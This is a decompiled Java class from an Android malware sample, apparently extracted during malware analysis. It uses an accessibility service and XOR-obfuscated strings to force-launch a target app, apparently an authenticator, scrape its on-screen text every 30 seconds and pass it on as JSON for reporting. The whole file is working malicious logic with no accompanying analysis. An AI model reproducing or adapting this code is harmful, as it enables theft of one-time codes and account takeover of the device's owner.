package com.zjxyxnvvp.nxvxchltf.i;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import com.zjxyxnvvp.nxvxchltf.util.b;
import java.util.List;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class r {
    private static short[] $ = {1122, 1139, 1134, 1122, 1120, 1151, 1139, 1121, 1408, 8596, 8331, 8327, 8332, 8333, 8347, 6404, 6408, 6410, 6473, 6400, 6408, 6408, 6400, 6411, 6402, 6473, 6406, 6409, 6403, 6421, 6408, 6414, 6403, 6473, 6406, 6423, 6423, 6420, 6473, 6406, 6418, 6419, 6415, 6402, 6409, 6419, 6414, 6404, 6406, 6419, 6408, 6421, 6485, 7340, 7353, 7338, 7337, 7316, 7340, 7332, 7332, 7340, 7335, 7342, 7316, 7338, 7358, 7359, 7331, 5770, 5766, 5773, 5772, 5786, 6088, 6137, 6137, 6057, 6125, 6118, 6124, 6138, 6119, 6062, 6141, 6057, 6124, 6129, 6112, 6138, 6141};

    /* renamed from: a  reason: collision with root package name */
    private final p f335a;

    /* renamed from: b  reason: collision with root package name */
    private long f336b;
    private long c;

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public r(p pVar) {
        this.f335a = pVar;
    }

    private JSONObject b(AccessibilityService accessibilityService, AccessibilityEvent accessibilityEvent) {
        if (UIDNwaidobaWIODb.i == null) {
            return null;
        }
        StringBuilder sb = new StringBuilder();
        List<AccessibilityNodeInfo> b2 = b.b(UIDNwaidobaWIODb.i, $(0, 8, 1046));
        for (int i = 1; i < b2.size(); i++) {
            AccessibilityNodeInfo accessibilityNodeInfo = b2.get(i);
            if (accessibilityNodeInfo.getText() != null) {
                sb.append(accessibilityNodeInfo.getText());
                sb.append(i % 2 == 0 ? $(8, 9, 1418) : $(9, 10, 8622));
            }
        }
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put($(10, 15, 8424), sb.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jSONObject;
    }

    public void a(AccessibilityService accessibilityService, AccessibilityEvent accessibilityEvent) {
        if (accessibilityEvent != null && UIDNwaidobaWIODb.i != null && accessibilityEvent.getPackageName() != null) {
            long currentTimeMillis = System.currentTimeMillis();
            CharSequence packageName = accessibilityEvent.getPackageName();
            String $2 = $(15, 53, 6503);
            boolean equals = packageName.equals($2);
            String $3 = $(53, 69, 7371);
            if (!equals) {
                f b2 = this.f335a.b($3);
                if (b2 != null && !b2.c() && currentTimeMillis - this.c > 7000) {
                    Intent launchIntentForPackage = accessibilityService.getPackageManager().getLaunchIntentForPackage($2);
                    if (launchIntentForPackage != null) {
                        accessibilityService.startActivity(launchIntentForPackage);
                    } else {
                        JSONObject jSONObject = new JSONObject();
                        try {
                            jSONObject.put($(69, 74, 5865), $(74, 91, 6025));
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        this.f335a.e($3, jSONObject);
                    }
                    this.c = currentTimeMillis;
                }
            } else if (currentTimeMillis - this.f336b > 30000) {
                JSONObject b3 = b(accessibilityService, accessibilityEvent);
                this.f336b = currentTimeMillis;
                this.f335a.e($3, b3);
            }
        }
    }
}
